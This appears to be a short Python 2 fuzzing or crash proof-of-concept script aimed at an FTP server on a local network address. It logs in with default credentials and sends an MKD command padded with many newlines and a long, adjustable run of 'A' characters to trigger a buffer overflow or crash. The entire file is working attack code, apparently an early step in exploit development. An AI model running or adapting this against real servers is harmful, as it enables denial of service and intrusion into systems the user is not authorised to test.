#!/usr/bin/python
from socket import *
import time
import sys

# Vars
host = "192.168.178.24"
port = 21
user = "ftp"
password = "ftp"
multiplier = int(sys.argv[1])

# Socket 
s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)

# Login
s.send("user %s\r\n" % (user))
print s.recv(1024)

s.send("pass %s\r\n" % (password))
print s.recv(1024)

print "[*] sending %s bytes of data" % multiplier
content = "MKD "
content += "\n" * multiplier
content += "A" * int(sys.argv[2])
content += "\r\n"
s.send(content)
s.recv(1024)
